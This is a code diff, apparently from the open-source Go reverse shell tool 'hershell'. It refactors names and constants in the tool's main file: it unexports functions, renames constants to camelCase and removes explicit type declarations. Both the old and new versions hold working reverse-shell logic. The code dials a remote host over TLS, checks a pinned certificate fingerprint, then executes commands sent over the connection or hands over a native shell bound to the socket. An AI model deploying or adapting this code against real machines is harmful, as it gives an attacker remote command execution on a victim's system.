@@ -8,7 +8,6 @@ import (
 	"encoding/hex"
 	"net"
 	"os"
-	"os/exec"
 	"strings"
 
 	"github.com/lesnuages/hershell/meterpreter"
@@ -16,9 +15,9 @@ import (
 )
 
 const (
-	ERR_COULD_NOT_DECODE = 1 << iota
-	ERR_HOST_UNREACHABLE = iota
-	ERR_BAD_FINGERPRINT  = iota
+	errCouldNotDecode  = 1 << iota
+	errHostUnreachable = iota
+	errBadFingerprint  = iota
 )
 
 var (
@@ -26,11 +25,11 @@ var (
 	fingerPrint   string
 )
 
-func InteractiveShell(conn net.Conn) {
+func interactiveShell(conn net.Conn) {
 	var (
-		exit    bool           = false
-		prompt  string         = "[hershell]> "
-		scanner *bufio.Scanner = bufio.NewScanner(conn)
+		exit    = false
+		prompt  = "[hershell]> "
+		scanner = bufio.NewScanner(conn)
 	)
 
 	conn.Write([]byte(prompt))
@@ -59,7 +58,7 @@ func InteractiveShell(conn net.Conn) {
 				exit = true
 			case "run_shell":
 				conn.Write([]byte("Enjoy your native shell\n"))
-				RunShell(conn)
+				runShell(conn)
 			default:
 				shell.ExecuteCmd(command, conn)
 			}
@@ -73,15 +72,15 @@ func InteractiveShell(conn net.Conn) {
 	}
 }
 
-func RunShell(conn net.Conn) {
-	var cmd *exec.Cmd = shell.GetShell()
+func runShell(conn net.Conn) {
+	var cmd = shell.GetShell()
 	cmd.Stdout = conn
 	cmd.Stderr = conn
 	cmd.Stdin = conn
 	cmd.Run()
 }
 
-func CheckKeyPin(conn *tls.Conn, fingerprint []byte) (bool, error) {
+func checkKeyPin(conn *tls.Conn, fingerprint []byte) (bool, error) {
 	valid := false
 	connState := conn.ConnectionState()
 	for _, peerCert := range connState.PeerCertificates {
@@ -93,22 +92,22 @@ func CheckKeyPin(conn *tls.Conn, fingerprint []byte) (bool, error) {
 	return valid, nil
 }
 
-func Reverse(connectString string, fingerprint []byte) {
+func reverse(connectString string, fingerprint []byte) {
 	var (
 		conn *tls.Conn
 		err  error
 	)
 	config := &tls.Config{InsecureSkipVerify: true}
 	if conn, err = tls.Dial("tcp", connectString, config); err != nil {
-		os.Exit(ERR_HOST_UNREACHABLE)
+		os.Exit(errHostUnreachable)
 	}
 
 	defer conn.Close()
 
-	if ok, err := CheckKeyPin(conn, fingerprint); err != nil || !ok {
-		os.Exit(ERR_BAD_FINGERPRINT)
+	if ok, err := checkKeyPin(conn, fingerprint); err != nil || !ok {
+		os.Exit(errBadFingerprint)
 	}
-	InteractiveShell(conn)
+	interactiveShell(conn)
 }
 
 func main() {
@@ -116,8 +115,8 @@ func main() {
 		fprint := strings.Replace(fingerPrint, ":", "", -1)
 		bytesFingerprint, err := hex.DecodeString(fprint)
 		if err != nil {
-			os.Exit(ERR_COULD_NOT_DECODE)
+			os.Exit(errCouldNotDecode)
 		}
-		Reverse(connectString, bytesFingerprint)
+		reverse(connectString, bytesFingerprint)
 	}
 }
